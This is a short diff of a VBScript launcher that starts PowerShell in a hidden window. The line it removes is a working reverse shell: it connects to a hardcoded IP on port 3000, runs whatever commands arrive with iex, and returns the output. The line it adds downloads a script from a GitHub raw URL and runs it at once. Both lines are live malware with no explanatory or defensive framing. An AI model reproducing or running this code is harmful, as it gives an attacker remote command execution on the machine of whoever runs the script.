@@ -1,2 +1,2 @@
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c powershell -Command while($true){try{$client = New-Object System.Net.Sockets.TcpClient('134.122.96.191', 3000);$sw = New-Object System.IO.StreamWriter($client.GetStream());$sr = New-Object System.IO.StreamReader($client.GetStream());try{$isexit = $true;while($isexit){$command = $sr.ReadLine();$cmdline = $(iex $command);$sw.WriteLine($cmdline -join ' ');$sw.Flush();}}catch{}}catch{}}", 0
+objShell.Run "cmd.exe /c powershell -Command $command = ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/NE1W01F/EXE/master/wow.txt'));iex $command;", 0
